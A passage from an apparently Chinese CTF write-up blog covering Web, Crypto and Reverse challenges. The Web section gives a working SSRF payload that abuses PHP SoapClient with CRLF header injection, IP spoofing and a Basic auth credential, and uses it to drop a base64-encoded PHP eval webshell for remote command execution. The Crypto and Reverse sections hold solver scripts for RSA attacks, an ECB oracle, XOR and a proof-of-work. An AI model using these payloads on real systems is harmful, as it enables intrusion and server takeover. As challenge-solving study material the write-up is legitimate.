class="hljs-string">&#x27;user&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$user</span>=<span class="hljs-string">&quot;stranger&quot;</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$user</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;user&#x27;</span>];<br>&#125;<br><span class="hljs-comment">//POST传参user</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;location&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$location</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;location&#x27;</span>]; <br>    <span class="hljs-comment">//若 location 参数已设置，就使用该参数创建一个 SoapClient 对象。SoapClient 是 PHP 用于与 SOAP Web 服务交互的类。</span><br>    <span class="hljs-variable">$client</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">SoapClient</span>(<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(<br>        <span class="hljs-string">&quot;location&quot;</span>=&gt;<span class="hljs-variable">$location</span>,<br>        <span class="hljs-string">&quot;uri&quot;</span>=&gt;<span class="hljs-string">&quot;hahaha&quot;</span>,<br>        <span class="hljs-string">&quot;login&quot;</span>=&gt;<span class="hljs-string">&quot;guest&quot;</span>,<br>        <span class="hljs-string">&quot;password&quot;</span>=&gt;<span class="hljs-string">&quot;gueeeeest!!!!&quot;</span>,<br>        <span class="hljs-string">&quot;user_agent&quot;</span>=&gt;<span class="hljs-variable">$user</span>.<span class="hljs-string">&quot;&#x27;s Chrome&quot;</span>));    <br>        <span class="hljs-comment">//location 指明了 Web 服务的地址，uri 是命名空间，login 和 password 为认证信息，user_agent 用于模拟浏览器请求。</span><br><br>    <span class="hljs-variable">$client</span>-&gt;<span class="hljs-title function_ invoke__">calculator</span>();<br>    <span class="hljs-comment">//接着调用 calculator 方法</span><br><br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;result&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Please give me a location&quot;</span>;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p>在h4d333333.php这部分设置了一系列东西，其中有设置 SOAP 服务的地址 location，在calculator.php 的源码中可以看到有检查请求客户端的IP代码</p><p>所以就可以想到SSRF，我们可以在 h4d333333.php 创建的实例 SOAP 打SSRF去访问calculator.php ，把 location 的值设置为 127.0.0.1 就可以绕过客户端 IP 的检测去访问calculator.php</p><p>GET传参</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/h4d333333.php?location=127.0.0.1/calculator.php<br></code></pre></td></tr></table></figure><p>还有一个POST请求的参数user，可以利用SSRF写shell，要POST打SSRF的话，接下来就是找需要提交哪些请求头和值</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stata">user=abc  <span class="hljs-comment">//POST传参 user ，值的话随便填写</span><br><br>然后是正常<span class="hljs-keyword">POST</span>打SSRF需要的请求头 <br>Content-<span class="hljs-keyword">Type</span>: application/x-www-<span class="hljs-keyword">form</span>-urlencoded  <span class="hljs-comment">//bp抓包后复制粘贴过来</span><br>X-Forwarded-<span class="hljs-keyword">For</span>: 127.0.0.1 <span class="hljs-comment">//上面要检查客户端的请求 IP ，所以这里可以加上 X - Forwarded - For: 127.0.0.1 来伪造IP</span><br>Content-Length: 104    <span class="hljs-comment">//请求的内容长度，是根据上面构造的 expression 来进行构造的</span><br></code></pre></td></tr></table></figure><p>每个请求头之间要用 %0d%0a 进行分隔开来，这个是回车符（ \r ）和换行符（ \n ）的URL编码形式</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">user=abc%0d%0aContent-Type: application/x-www-form-urlencoded%0d%0aX-Forwarded-For: <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>%0d%0aAUTHORIZATION: Basic YWFhYWFhYWFhYWFhZG1pbjppX3dhbnRfdG9fZ2V0STAwX2luTXlUM3N0%0d%0aContent-Length: <span class="hljs-number">104</span>%0d%0a%0d%0aexpression=file_put_contents(<span class="hljs-string">&#x27;shell.php&#x27;</span>, base64_decode(<span class="hljs-string">&#x27;PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4=&#x27;</span>))       <span class="hljs-comment">//base64_decode前也有空格</span><br></code></pre></td></tr></table></figure><p>![屏幕截图 2025-03-31 234926](..&#x2F;images&#x2F;屏幕截图 2025-03-31 234926.png)</p><p>访问shell.php，POST参数 cmd 进行RCE</p><p>![屏幕截图 2025-03-31 235651](..&#x2F;images&#x2F;屏幕截图 2025-03-31 235651.png) </p><p>![屏幕截图 2025-03-31 235719](..&#x2F;images&#x2F;屏幕截图 2025-03-31 235719.png)</p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h3 id="凯撒加密"><a href="#凯撒加密" class="headerlink" title="凯撒加密"></a><strong>凯撒加密</strong></h3><p><img src="/../images/201210.png" alt="201210"> </p><h3 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a><strong>RSA</strong></h3><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs makefile">from Crypto.Util.number import *<br><br>n = 33108009203593648507706487693709965711774665216872550007309537128959455938833<br>p = 192173332221883349384646293941837353967<br>q = 172282016556631997385463935089230918399<br>e = 65537<br>c = 5366332878961364744687912786162467698377615956518615197391990327680664213847<br><br>phi_n = (p - 1) * (q - 1)<br>d = inverse(e, phi_n)<br>m = pow(c, d, n)<br><br>flag_bytes = long_to_bytes(m)<br>flag = flag_bytes.decode(&#x27;utf-8&#x27;)<br>print(flag)<br></code></pre></td></tr></table></figure><h3 id="共模攻击"><a href="#共模攻击" class="headerlink" title="共模攻击"></a><strong>共模攻击</strong></h3><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">from</span> Crypto.Util.number <span class="hljs-meta">import</span> *<br><br>n = <span class="hljs-number">19742875423645690846073637620470497648804310111201409901059297083827103813674034450200432098143959078292346910591785265323563248781526393718834491458926162514713269984791730816121181307827624489725923763353393879316510062227511469438742429290073999388690825732236465647396755899136346150862848924231619666069528077790933176798057396704758072769660663756346237040909579775389576227450505746914753205890194457812893098491264392293949768193694560954874603451253079446652049592976605414438411872223250039782381259212718733455588477129910357095186014496957765297934289263536712574572533650393220492870445376144568199077767</span><br><span class="hljs-symbol">e1</span> = <span class="hljs-number">911</span><br><span class="hljs-symbol">e2</span> = <span class="hljs-number">967</span><br><span class="hljs-symbol">c1</span> = <span class="hljs-number">18676091924461946809127036439355116782539894105245796626898495935702348484076501694838877829307466429933623102626122909782775514926293363853121828819237500456062111805212209491398720528499589486241208820804465599279152640624618194425740368495072591471531868392274503936869225072123214869399971636428177516761675388589238329574042518038702529606188240859751459632643230538522947412931990009143731829484941397093509641320264169403755707495153433568106934850283614529793695266717330769019091782929139589939928210818515744604847453929432990185347112319971445630830477574679898503825626294542336195240055995445217249602983</span><br><span class="hljs-symbol">c2</span> = <span class="hljs-number">4229417863231092939788858229435938841085459330992709019823280977891432565586698228613770964563920779991584732527715378842621171338649745186081520176123907689669636473919678398014317024138622949923292787095400632018991311254591786179660603414693984024161009444842277220189315861986306573182865656366278782315864366857374874763243428496061153290565891942968876789905670073321426112497113145141539289020571684634406829272902118484670099097148727072718299512735637087933649345419433312872607209633402427461708181971718804026293074540519907755129917132236240606834816534369171888633588190859475764799895410284484045429152</span><br><br><span class="hljs-symbol">def</span> extended_gcd(a, b):<br>    <span class="hljs-meta">if</span> a == <span class="hljs-number">0</span>:<br>        return (b, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>)<br><span class="hljs-symbol">    else:</span><br>        g, y, x = extended_gcd(<span class="hljs-keyword">b</span> % a, a)<br>        return (g, x - (<span class="hljs-keyword">b</span> <span class="hljs-comment">// a) * y, y)</span><br><br>g, <span class="hljs-built_in">s1</span>, <span class="hljs-built_in">s2</span> = extended_gcd(e1, e2)<br><br><span class="hljs-symbol">if</span> <span class="hljs-built_in">s1</span> &lt; <span class="hljs-number">0</span>:<br>    <span class="hljs-built_in">s1</span> = -<span class="hljs-built_in">s1</span><br>    <span class="hljs-built_in">c1</span> = inverse(<span class="hljs-built_in">c1</span>, n)<br><span class="hljs-symbol">if</span> <span class="hljs-built_in">s2</span> &lt; <span class="hljs-number">0</span>:<br>    <span class="hljs-built_in">s2</span> = -<span class="hljs-built_in">s2</span><br>    <span class="hljs-built_in">c2</span> = inverse(<span class="hljs-built_in">c2</span>, n)<br><br>m = pow(<span class="hljs-built_in">c1</span>, <span class="hljs-built_in">s1</span>, n) * pow(<span class="hljs-built_in">c2</span>, <span class="hljs-built_in">s2</span>, n) % n<br><br><span class="hljs-symbol">flag</span> = long_to_bytes(m)<br><span class="hljs-symbol">print</span>(flag.decode())<br></code></pre></td></tr></table></figure><h3 id="ECBpad"><a href="#ECBpad" class="headerlink" title="ECBpad"></a><strong>ECBpad</strong></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> tqdm <span class="hljs-keyword">import</span> *<br><br>r=remote(<span class="hljs-string">&#x27;nc1.ctfplus.cn&#x27;</span>,<span class="hljs-number">37297</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pad</span>(<span class="hljs-params">leng</span>):<br>    pad_len = block - (leng % block) <span class="hljs-keyword">if</span>  leng % block != <span class="hljs-number">0</span> <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;F&#x27;</span> * pad_len<br><br>secret_len = <span class="hljs-number">31</span><br>ori_padding_len = <span class="hljs-number">1</span><br>block = <span class="hljs-number">16</span><br>flag = <span class="hljs-string">b&#x27;&#x27;</span><br><br>padding = [pad(k) <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>)]<br>padding = padding[<span class="hljs-number">1</span>:]+[padding[<span class="hljs-number">0</span>]]<br><span class="hljs-built_in">print</span>(padding)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(secret_len):<br>    find=<span class="hljs-number">0</span><br>    payload = <span class="hljs-string">b&#x27;*&#x27;</span>*(ori_padding_len+i+<span class="hljs-number">1</span>)<br><br>    group = i//block<br>    r.sendlineafter(<span class="hljs-string">b&#x27;[-] &#x27;</span>,<span class="hljs-string">b&#x27;yes&#x27;</span>)<br>    r.sendlineafter(<span class="hljs-string">b&#x27;[-] &#x27;</span>,payload)<br>    r.recvuntil(<span class="hljs-string">b&#x27;Your cipher:&#x27;</span>)<br>    data = r.recvline().strip()<br>    <span class="hljs-keyword">if</span> group == <span class="hljs-number">0</span>:<br>        prob=data[-<span class="hljs-number">32</span>:]<br>    <span class="hljs-keyword">else</span>:<br>        prob=(data[-<span class="hljs-number">32</span>*(group+<span class="hljs-number">1</span>):-<span class="hljs-number">32</span>*(group+<span class="hljs-number">1</span>)+<span class="hljs-number">32</span>])<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;i+<span class="hljs-number">1</span>&#125;</span> prob = <span class="hljs-subst">&#123;prob&#125;</span>&#x27;</span>)<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> trange(<span class="hljs-number">32</span>,<span class="hljs-number">127</span>):<br>        r.sendlineafter(<span class="hljs-string">b&#x27;[-] &#x27;</span>,<span class="hljs-string">b&#x27;yes&#x27;</span>)<br>        flag_suffix = flag[:<span class="hljs-built_in">min</span>(<span class="hljs-built_in">len</span>(flag),<span class="hljs-number">15</span>)]<br>        payload = <span class="hljs-built_in">bytes</span>([j]) + flag_suffix + padding[<span class="hljs-built_in">min</span>(<span class="hljs-built_in">len</span>(flag_suffix),<span class="hljs-number">15</span>)]<br>        <span class="hljs-comment">#print(j,payload)</span><br>        r.sendlineafter(<span class="hljs-string">b&#x27;[-] &#x27;</span>,payload)<br>        r.recvuntil(<span class="hljs-string">b&#x27;Your cipher:&#x27;</span>)<br>        data = r.recvline().strip()<br>        <span class="hljs-keyword">if</span> data[:<span class="hljs-number">32</span>]==prob:<br>            flag = <span class="hljs-built_in">bytes</span>([j]) + flag<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;i+<span class="hljs-number">1</span>&#125;</span> flag = <span class="hljs-subst">&#123;flag&#125;</span>&#x27;</span>)<br>            <span class="hljs-built_in">print</span>()<br>            find=<span class="hljs-number">1</span><br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">if</span> find == <span class="hljs-number">0</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;i+<span class="hljs-number">1</span>&#125;</span> cannot find!&#x27;</span>)<br>        <span class="hljs-keyword">break</span><br><br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="X0R"><a href="#X0R" class="headerlink" title="X0R"></a><strong>X0R</strong></h3><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs makefile">from Crypto.Util.number import *<br>from pwn import xor<br><br><span class="hljs-comment"># 已知的加密结果</span><br>e2 = 10706859949950921239354880312196039515724907<br>f1 = 4585958212176920650644941909171976689111990<br>f2 = 3062959364761961602614252587049328627114908<br><br><span class="hljs-comment"># 逆向计算 enc</span><br>e1 = e2 ^ f2<br>enc = e1 ^ f1<br><br><span class="hljs-comment"># 将 enc 转换为字节对象</span><br>enc_bytes = long_to_bytes(enc)<br><br><span class="hljs-comment"># 已知 flag 前缀为 SYC&#123;</span><br>prefix = b&#x27;SYC&#123;&#x27;<br><br><span class="hljs-comment"># 计算 key</span><br>key = xor(prefix, enc_bytes[:len(prefix)])<br><br><span class="hljs-comment"># 确保 key 长度为 4</span><br>assert len(key) == 4<br><br><span class="hljs-comment"># 解密 flag</span><br>flag = xor(enc_bytes, key)<br><br><span class="hljs-section">print(&quot;Flag:&quot;, flag.decode())</span><br></code></pre></td></tr></table></figure><h3 id="dp"><a href="#dp" class="headerlink" title="dp"></a><strong>dp</strong></h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> Crypto.Util.number import long_to_bytes<br><br><span class="hljs-comment"># 已知参数</span><br><span class="hljs-attribute">c</span> = <span class="hljs-number">127916287434936224964530288403657504450134210781148845328357237956681373722556447001247137686758965891751380034827824922625307521221598031789165449134994998397717982461775225812413476283147124013667777578827293691666320739053915493782515447112364470583788127477537555786778672970196314874316507098162498135060</span><br><span class="hljs-attribute">n</span> = <span class="hljs-number">157667866005866043809675592336288962106125998780791920007920833145068421861029354497045918471672956655205541928071253023208751202980457919399456984628429198438149779785543371372206661553180051432786094530268099696823142821724314197245158942206348670703497441629288741715352106143317909146546420870645633338871</span><br><span class="hljs-attribute">e</span> = <span class="hljs-number">65537</span><br><span class="hljs-attribute">dp</span> = <span class="hljs-number">2509050304161548479367108202753097217949816106531036020623500808413533337006939302155166063392071003278307018323129989037561756887882853296553118973548769</span><br><br><span class="hljs-comment"># 恢复p</span><br><span class="hljs-attribute">for</span> k in range(<span class="hljs-number">1</span>, e):<br>    <span class="hljs-attribute">if</span> (dp * e - <span class="hljs-number">1</span>) % k == <span class="hljs-number">0</span>:<br>        <span class="hljs-attribute">hp</span> = (dp * e - <span class="hljs-number">1</span>) // k + <span class="hljs-number">1</span><br>        <span class="hljs-attribute">if</span> n % hp == <span class="hljs-number">0</span>:<br>            <span class="hljs-attribute">p</span> = hp<br>            <span class="hljs-attribute">q</span> = n // p<br>            <span class="hljs-attribute">break</span><br><br><span class="hljs-comment"># 计算私钥d</span><br><span class="hljs-attribute">phi</span> = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)<br><span class="hljs-attribute">d</span> = pow(e, -<span class="hljs-number">1</span>, phi)<br><br><span class="hljs-comment"># 解密得到明文m</span><br><span class="hljs-attribute">m</span> = pow(c, d, n)<br><br><span class="hljs-comment"># 将明文转换为字节串</span><br><span class="hljs-attribute">flag</span> = long_to_bytes(m)<br><br><span class="hljs-attribute">print</span>(<span class="hljs-string">&quot;Flag:&quot;</span>, flag.decode())<br></code></pre></td></tr></table></figure><h3 id="nc"><a href="#nc" class="headerlink" title="nc"></a><strong>nc</strong></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha256<br><br>io = remote(<span class="hljs-string">&#x27;nc1.ctfplus.cn&#x27;</span>, <span class="hljs-number">19417</span>)<br>l = string.ascii_letters + string.digits<br>con = io.recvuntil(<span class="hljs-string">b&quot;XXXX: &quot;</span>).decode()<br><span class="hljs-comment"># print(con)</span><br><br>p2 = re.findall(<span class="hljs-string">r&#x27;sha256\(XXXX\+(.*)\)&#x27;</span>, con)[<span class="hljs-number">0</span>]<br>ss = re.findall(<span class="hljs-string">r&#x27;== (.*)&#x27;</span>, con)[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>:<span class="hljs-number">8</span>]<br><span class="hljs-built_in">print</span>(p2)<br><span class="hljs-built_in">print</span>(ss)<br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> l:<br>    <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> l:<br>        <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> l:<br>            <span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> l:<br>                p1 = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;a&#125;</span><span class="hljs-subst">&#123;b&#125;</span><span class="hljs-subst">&#123;c&#125;</span><span class="hljs-subst">&#123;d&#125;</span>&#x27;</span><br>                proof = p1 + p2<br>                con = <span class="hljs-string">&#x27;b615cbae&#x27;</span><br>                xxx = hexdigest = sha256(proof.encode()).hexdigest()<br>                <span class="hljs-keyword">if</span> xxx[<span class="hljs-number">0</span>:<span class="hljs-number">8</span>] == ss:<br>                    ss = p1<br>                    <span class="hljs-built_in">print</span>(p1)<br>s1 = ss.encode()<br>io.sendline(s1)<br><span class="hljs-comment"># io.sendafter(b&#x27;[-] &#x27;,1)</span><br>re2 = io.recvuntil(<span class="hljs-string">b&#x27;[-] &#x27;</span>).decode()<br>io.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>, <span class="hljs-number">33</span>):<br>    io.recvuntil(<span class="hljs-string">b&#x27;[-] &#x27;</span>)<br>    io.sendline(<span class="hljs-built_in">str</span>(i).encode())<br>    re4 = io.recv().decode()<br>    flag += re4.replace(<span class="hljs-string">&#x27;[+] &#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(flag)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;S&#x27;</span> + flag)<br></code></pre></td></tr></table></figure><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h3 id="先来一道签到题"><a href="#先来一道签到题" class="headerlink" title="先来一道签到题"></a>先来一道签到题</h3><p>AI</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 目标字符串</span><br>target_data = <span class="hljs-string">&quot;TTDv^jrZu`Gg6tXfi+pZojpZSjXmbqbmt.&amp;x&quot;</span><br><br><span class="hljs-comment"># 初始化空字符串用于存储解密后的结果</span><br>decrypted = <span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-comment"># 遍历目标字符串，每次处理两个字符</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(target_data), <span class="hljs-number">2</span>):<br>    <span class="hljs-comment"># 处理第一个字符，逆向异或操作</span><br>    first_char = <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(target_data[i]) ^ <span class="hljs-number">7</span>)<br>    <span class="hljs-comment"># 处理第二个字符，逆向减法操作</span><br>    second_char = <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(target_data[i + <span class="hljs-number">1</span>]) + <span class="hljs-number">5</span>) <span class="hljs-keyword">if</span> i + <span class="hljs-number">1</span> &lt; <span class="hljs-built_in">len</span>(target_data) <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-comment"># 将解密后的字符添加到结果字符串中</span><br>    decrypted += first_char + second_char<br><br><span class="hljs-comment"># 输出解密后的字符串，即 flag</span><br><span class="hljs-built_in">print</span>(decrypted)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
